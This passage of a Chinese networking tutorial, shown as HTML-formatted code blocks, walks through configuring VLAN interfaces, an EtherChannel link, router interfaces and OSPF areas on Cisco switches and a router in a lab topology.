class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 321</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 321</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.21.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 320</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 320</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.20.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>MS3:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int f0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 340</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 340</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.40.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int f0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 350</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 350</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.50.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span></span><br></pre></td></tr></table></figure><p>MS4:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 331</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 331</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.31.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>MS5:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 331</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 331</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.31.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 330</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 330</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.30.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span></span><br></pre></td></tr></table></figure><blockquote><p>MS2和MS6两台三层交换机要形成聚合链路,所以这里单独分开配置。</p></blockquote><p>MS2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">channel-group 1 mode on</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport trunk encapsulation dot1Q</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport mode trunk</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">channel-group 1 mode on</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport trunk encapsulation dot1Q</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport mode trunk</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int Port-channel 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport trunk encapsulation dot1Q</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport mode trunk</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 320</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 320</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.20.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int range f0/2-3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">switchport access vlan 300</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">int vlan 300</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.1.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 340</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 340</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.40.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 341</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 341</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.60.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>MS6:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 330</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 330</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.30.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int range fa0/2-3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">channel-group 1 mode on</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">switchport trunk encapsulation dot1Q</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">switchport mode trunk</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">switchport access vlan 300</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if-range)#</span><span class="language-bash">int vlan 300</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.1.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 350</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 350</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.70.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>聚合链路完成！下面我们配置路由器Router0的接口IP和网关。<br>Router 0:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int e1/1</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 10.10.70.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int e1/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 10.10.60.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int f0/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 10.10.50.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int f0/1</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip address 200.1.1.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><blockquote><p>到这里，我们把全部的接口和网关已经配置好了，万事大吉，只欠东风(路由策略)！<br>只要把路由策略做完就能把所有设备联通，<br>下面我们就开始我们熟悉的OSPF动态路由的配置！</p></blockquote><h2 id="0x03-OSPF动态路由协议部署"><a href="#0x03-OSPF动态路由协议部署" class="headerlink" title="0x03 : OSPF动态路由协议部署"></a>0x03 : OSPF动态路由协议部署</h2><blockquote><p>如图，我将划分的ospf区域标注起来:<br><img src="https://user-images.githubusercontent.com/57565901/121667233-a41e5800-cadc-11eb-8b5b-7f1631692e75.png" alt="image"></p></blockquote><p>MS0:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 1.1.1.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 1.1.1.1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">log-adjacency-changes</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 1.1.1.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 172.16.0.0 0.0.255.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.21.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><p>MS1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 2.2.2.2 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 2.2.2.2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 2.2.2.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.21.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.20.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span></span><br></pre></td></tr></table></figure><p>MS4:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 5.5.5.5 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 5.5.5.5</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 5.5.5.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 172.20.0.0 0.0.255.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.31.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">log-adjacency-changes</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span></span><br></pre></td></tr></table></figure><p>MS5:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 6.6.6.6 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 6.6.6.6</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 6.6.6.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.31.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.30.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">log-adjacency-changes</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span></span><br></pre></td></tr></table></figure><blockquote><p>下面配置聚合链路中的OSPF：</p></blockquote><p>MS2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 3.3.3.3 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 3.3.3.3</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">log</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 3.3.3.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.20.0 0.0.0.255 area 1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.40.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.1.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.60.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span></span><br></pre></td></tr></table></figure><p>MS6:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Switch(config)<span class="comment">#int loopback0</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">%LINK-5-CHANGED: Interface Loopback0, changed state to up</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">LINEPROTO-5-UPDOWN: Line protocol on Interface Loopback0, changed state to up</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 7.7.7.7 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 7.7.7.7</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">log</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 7.7.7.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.30.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.70.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.70.0 0.0.0.255 area 4</span></span><br><span class="line">01:15:16: %OSPF-5-ADJCHG: Process 2, Nbr 6.6.6.6 on Vlan330 network </span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Incomplete <span class="built_in">command</span>.</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Switch(config-router)<span class="comment">#network 10.10.1.0 0.0.0.255 area 0</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span></span><br></pre></td></tr></table></figure><p>MS3:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 4.4.4.4 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 4.4.4.4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">log</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 4.4.4.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.40.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.10.50.0 0.0.0.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 192.168.0.0 0.0.255.255 area 3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip route 0.0.0.0 